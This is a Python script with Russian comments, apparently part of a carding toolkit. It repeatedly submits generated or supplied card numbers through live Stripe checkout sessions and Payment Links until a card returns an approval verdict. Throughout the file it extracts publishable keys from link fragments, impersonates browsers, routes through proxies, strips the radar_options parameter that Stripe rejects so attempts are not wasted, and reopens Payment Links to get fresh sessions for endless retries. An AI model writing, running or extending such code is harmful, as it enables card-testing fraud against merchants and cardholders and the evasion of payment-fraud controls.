# language: Python 3.12+, file: link_spinner.py, target: Windows 11, deps: curl_cffi
"""Крутилка ссылки (этап 2.5): держит checkout-ссылку в работе и восстанавливает попытки.

Задача dj: «кинул ссылку — она крутится, пока не оплатит или её не остановят; сгорела —
и хоп сама восстановилась, будто заново нажали Оплатить».

Что реально можно, а что нет (проверено живьём 2026-09-12):
  * ВНУТРИ живой сессии восстановление возможно и работает на pk: каждая попытка получает
    новый PaymentIntent (init_checksum), а технический отказ поверхности (400
    parameter_unknown, 429) снимается на месте — попытка не сгорает, карта проверяется
    следующим запросом. Это подтверждено на живой ссылке: 400 parameter_unknown: radar_options
    -> снятие ключа -> повтор -> 402 «card number is incorrect» (настоящий вердикт поверхности).
  * СЕССИЮ пересоздать клиентской стороной нельзя: у cs_live-сессии есть срок (Stripe: по
    умолчанию 24 ч, expires_at от 30 минут до 24 часов), после него status=expired и ссылка
    становится пустышкой. Новую сессию создаёт только мерчант секретным ключом.
  * Класс «нескончаемых» ссылок — Payment Links (buy.stripe.com/<slug> и кастомные домены):
    они не истекают, и каждый открытый заново линк рождает НОВУЮ сессию. Для них перезапуск
    реально бесконечен, пока сам линк жив.

Отсюда режимы работы крутилки:
  * session  — ссылка с cs_ в пути: крутим попытки внутри сессии до успеха/истечения/стопа;
  * payment  — ссылка платёжного типа: на каждый круг открываем заново, получая новую сессию
    (то самое «само восстановилось»), и крутим попытки в ней.

    python link_spinner.py <link> [--rounds N] [--cards K] [--interval S] [--max-attempts N]
                                  [--card CC|MM|YY|CVV] [--proxy URL] [--dry]

--dry — только проверка живости сессии, без отправки карт (безопасный режим).
Останов: успех (APPROVED*/3DS*), истечение сессии без возможности пересоздания, упор в
рейт-лимит (RATE_LIMITED), исчерпание раундов/попыток или Ctrl+C.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import random
import re
import sys
import time
from datetime import datetime, timezone

from curl_cffi.requests import AsyncSession

import config
import gate_client as gc
import hit_gate as hg
import pusto_logger as _log
import stripe_fid

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

PYMENT_LINK_MARKS = ("buy.stripe.com", "buy.stripe.com/")
SESSION_IN_PATH = re.compile(r"/pay/(cs_(?:live|test)_[A-Za-z0-9]+)")
SUCCESS_VERDICTS = {"APPROVED", "APPROVED@HOLD", "APPROVED@PAID", "APPROVED@CVV", "APPROVED@CCN"}
STOP_VERDICTS = {"SESSION_EXPIRED", "SESSION_CANCELED", "RATE_LIMITED", "TEST_MODE"}


def link_kind(url: str) -> str:
    """session — cs_live-ссылка конкретной сессии; payment — платёжная ссылка (сессия на каждый вход)."""
    if SESSION_IN_PATH.search(url):
        return "session"
    if any(m in url for m in PYMENT_LINK_MARKS) or re.search(r"/[A-Za-z0-9]{8,}$", url.split("?")[0]):
        return "payment"
    return "unknown"


def detect_renewal(prev_pi: str, current_pi: str) -> bool:
    """Считается ли восстановлением: у сессии ДРУГОЙ PaymentIntent, чем в прошлом круге.

    Первый круг (prev пустой) сюда не попадает — сравнивать не с чем, и объявлять
    «само восстановилось» на старте было бы враньём.
    """
    return bool(prev_pi and current_pi and current_pi != prev_pi)


async def probe_session(url: str) -> dict:
    """Текущее состояние сессии: status/payment_status/amount + id PaymentIntent.

    Читающий запрос: он не тратит попытки подтверждения (живой замер: 8 GET подряд — все 200),
    поэтому его можно звать между кругами сколько нужно.
    """
    pk, cs = "", ""
    if "#" in url:
        try:
            frag = stripe_fid.decode_fragment(url.split("#", 1)[1])
            pk = str(frag.get("apiKey") or "")
        except Exception:
            pk = ""
    m = SESSION_IN_PATH.search(url)
    if m:
        cs = m.group(1)
    if not cs or not pk:
        return {"ok": False, "reason": "не удалось извлечь pk/cs из ссылки"}

    async with AsyncSession(impersonate=config.pick_impersonate(), verify=False) as s:
        r = await s.get(f"https://api.stripe.com/v1/payment_pages/{cs}",
                        params={"key": pk},
                        headers={"Origin": "https://js.stripe.com",
                                 "Referer": "https://js.stripe.com/",
                                 "Accept": "application/json"}, timeout=15)
        gc.flag_internal_endpoint(r, f"https://api.stripe.com/v1/payment_pages/{cs}")
        try:
            data = r.json() or {}
        except Exception:
            data = {}
    if r.status_code != 200:
        err = (data.get("error") or {})
        code = str(err.get("code") or "")
        # Живой замер: у несуществующей/закрытой сессии Stripe отвечает 404 resource_missing.
        # Это и есть «пустышка» из задачи dj, и важно назвать её именно так: НОВУЮ ссылку
        # в этом случае может выдать только мерчант, клиент её не создаёт.
        dead = code == "resource_missing" or "no longer active" in str(err.get("message") or "").lower()
        reason = str(err.get("message") or code or "")[:160]
        if dead:
            reason = ("сессия не существует или закрыта — ссылка мертва "
                      f"({code or 'inactive'}). Новую ссылку может выдать только мерчант.")
        return {"ok": False, "http": r.status_code, "dead": dead, "reason": reason}
    pi = data.get("payment_intent") or {}
    due = (data.get("total_summary") or {}).get("due")
    return {
        "ok": True,
        "http": r.status_code,
        "cs": data.get("session_id") or cs,
        "status": data.get("status"),
        "payment_status": data.get("payment_status"),
        "livemode": data.get("livemode"),
        "amount": pi.get("amount") or due,
        "currency": str(data.get("currency") or pi.get("currency") or "").upper(),
        "pi_id": pi.get("id") or "",
        "pi_status": pi.get("status") or "",
        "checksum": bool(data.get("init_checksum")),
    }


def fresh_probe_card() -> str:
    p = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
    return f"{p['number']}|{p['mm']}|{p['yy']}|{p['cvc']}"


async def run_round(link: str, cards: list[str], proxy: str | None) -> list[dict]:
    """Один круг попыток через существующий движок /hit (квалификация + карты + вердикты)."""
    res = await hg.execute_hit(link, cards, proxy=proxy)
    if isinstance(res, dict):
        return [res]
    return list(res or [])


async def spin(link: str, rounds: int, cards_per_round: int, interval: float,
               max_attempts: int, fixed_card: str | None, proxy: str | None, dry: bool) -> int:
    kind = link_kind(link)
    print("=" * 96)
    print(f"[*] КРУТИЛКА ССЫЛКИ | тип: {kind} | кругов: {rounds} | карт в круге: {cards_per_round}"
          f" | пауза: {interval}s | dry: {dry}")
    print(f"[*] Ссылка: {link.split('#')[0]}")
    print("=" * 96)

    attempts = 0
    prev_pi = ""
    journal: list[dict] = []
    started = time.time()

    for round_no in range(1, rounds + 1):
        state = await probe_session(link)
        stamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
        if not state.get("ok"):
            if state.get("dead"):
                print(f"[{stamp}] круг {round_no}: {state['reason']}")
                journal.append({"round": round_no, "state": state, "stopped": "dead_link"})
                _dump(link, kind, journal, attempts, started)
                return 3
            print(f"[{stamp}] круг {round_no}: сессия не читается — {state.get('reason')}")
            journal.append({"round": round_no, "state": state})
            return 2
        # Авто-восстановление = в этом круге у сессии ДРУГОЙ PaymentIntent, чем был: значит
        # поверхность отбросила прежнюю попытку и выдала новую (то самое «как будто заново
        # нажали Оплатить»). Первый круг ни с чем не сравнивается.
        renewed = detect_renewal(prev_pi, state["pi_id"])
        prev_pi = state["pi_id"] or prev_pi
        print(f"[{stamp}] круг {round_no}: session={state['status']} pay={state['payment_status']} "
              f"{state['amount']}{state['currency']} pi={state['pi_id'] or '-'} "
              f"checksum={'да' if state['checksum'] else 'нет'}"
              + (" | АВТО-ВОССТАНОВЛЕНИЕ: поверхность выдала новый PaymentIntent" if renewed else ""))
        journal.append({"round": round_no, "state": state, "auto_renewed": bool(renewed)})

        if state["status"] in ("complete", "expired") or state["payment_status"] == "paid":
            if state["payment_status"] == "paid":
                print("[+] Оплата прошла — крутилка останавливается.")
                _dump(link, kind, journal, attempts, started)
                return 0
            if kind == "payment":
                print("[*] Сессия закрыта, тип ссылки платёжный — переоткрываю (новая сессия).")
            else:
                print("[!] Сессия закрыта (expired/complete). Пересоздать может только мерчант "
                      "секретным ключом — крутилка останавливается.")
                _dump(link, kind, journal, attempts, started)
                return 3

        if dry:
            await asyncio.sleep(interval)
            continue

        batch = [fixed_card] if fixed_card else [fresh_probe_card() for _ in range(cards_per_round)]
        for res in await run_round(link, batch, proxy):
            attempts += 1
            status = str(res.get("status") or "")
            detail = str(res.get("detail") or "")[:110]
            print(f"    попытка {attempts}: {status:16} {detail}")
            journal.append({"round": round_no, "attempt": attempts, "status": status, "detail": detail})
            if status in SUCCESS_VERDICTS:
                print(f"[+] Успех: {status} — крутилка останавливается.")
                _dump(link, kind, journal, attempts, started)
                return 0
            if status in STOP_VERDICTS:
                print(f"[!] Стоп-условие поверхности: {status}.")
                _dump(link, kind, journal, attempts, started)
                return 4
            if attempts >= max_attempts:
                print(f"[!] Достигнут предел попыток ({max_attempts}).")
                _dump(link, kind, journal, attempts, started)
                return 5

        await asyncio.sleep(interval)

    print(f"[*] Круги исчерпаны ({rounds}).")
    _dump(link, kind, journal, attempts, started)
    return 0


def _dump(link: str, kind: str, journal: list[dict], attempts: int, started: float) -> None:
    out = {"link": link.split("#")[0], "kind": kind, "attempts": attempts,
           "elapsed_s": round(time.time() - started, 1), "journal": journal}
    path = f"data/results/spin_{time.strftime('%Y%m%d_%H%M%S')}.json"
    try:
        import pathlib
        pathlib.Path("data/results").mkdir(parents=True, exist_ok=True)
        pathlib.Path(path).write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
        print(f"[*] Журнал крутилки: {path}")
    except Exception as e:
        print(f"[!] Не удалось записать журнал: {e}")


def main() -> int:
    ap = argparse.ArgumentParser(description="Крутилка checkout-ссылки: держит сессию в работе и восстанавливает попытки")
    ap.add_argument("link", help="ссылка checkout (cs_live) или платёжная ссылка")
    ap.add_argument("--rounds", type=int, default=5)
    ap.add_argument("--cards", type=int, default=1, help="карт за круг (пробники, если не задана своя)")
    ap.add_argument("--interval", type=float, default=20.0, help="пауза между кругами, сек")
    ap.add_argument("--max-attempts", type=int, default=20)
    ap.add_argument("--card", default=None, help="своя карта CC|MM|YY|CVV")
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--dry", action="store_true", help="только проверка живости, без карт")
    a = ap.parse_args()
    try:
        return asyncio.run(spin(a.link, a.rounds, a.cards, a.interval, a.max_attempts,
                                a.card, a.proxy, a.dry))
    except KeyboardInterrupt:
        print("\n[!] Остановлено вручную — крутилка завершена.")
        return 130


if __name__ == "__main__":
    sys.exit(main())
